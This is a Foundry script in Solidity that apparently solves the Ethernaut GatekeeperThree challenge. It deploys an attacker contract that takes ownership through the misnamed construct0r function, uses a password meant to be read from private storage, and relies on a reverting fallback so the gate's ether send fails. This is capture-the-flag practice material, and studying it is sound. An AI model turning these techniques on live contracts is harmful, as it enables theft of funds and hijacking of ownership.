pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GatekeeperThree} from "../src/GatekeeperThree.sol";
import {console} from "forge-std/console.sol";

// for anvil testing
contract deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        GatekeeperThree gatekeeper = new GatekeeperThree();

        vm.stopBroadcast();
    }
}

contract Enter
{
    GatekeeperThree gatekeeperThree;

    constructor(address gatekeeperAddr)
    {
        gatekeeperThree = GatekeeperThree(payable(gatekeeperAddr));
    }

    fallback() external payable
    {
        revert();
    }

    function claimOwnership() external
    {
        gatekeeperThree.construct0r();
    }

    function createTrick() external
    {
        gatekeeperThree.createTrick();
    }

    function enter() external
    {
        gatekeeperThree.enter();
    }

    function submitPassword(uint password) external
    {
        gatekeeperThree.getAllowance(password);
    }

    function getOwner() public view returns (address)
    {
        return gatekeeperThree.owner();
    }

    function getEntrant() public view returns (address)
    {
        return gatekeeperThree.entrant();
    }
}

contract setUp is Script
{
    function run() external
    {
        address payable gatekeeperAddress = payable(/* instance address */);
        vm.startBroadcast();
        GatekeeperThree(gatekeeperAddress).createTrick();
        // record the trick's address to examine its storage:
        address trickAddr = address(GatekeeperThree(gatekeeperAddress).trick());
        console.log("trick address:", trickAddr);
    }
}

contract enterGate is Script
{
    function run() external
    {
        // cast storage 0xtrick-address 2 --rpc-url $RPC_URL
        bytes32 password = 0x0000000000000000000000000000000000000000000000000000000012345678;
        address payable gatekeeperAddress = payable(/* instance address */);

        vm.startBroadcast();

        Enter entry = new Enter(gatekeeperAddress);
        console.log("entry address:", address(entry));

        entry.claimOwnership();
        GatekeeperThree(gatekeeperAddress).getAllowance(uint(password));

        // fund the gatekeeper
        (bool success, ) = gatekeeperAddress.call{value: 0.00101 ether}("");
        require (success, "funding gatekeeper failed");

        entry.enter();

        console.log("owner:", entry.getOwner());
        console.log("entrant:", entry.getEntrant());

        vm.stopBroadcast();
    }
}
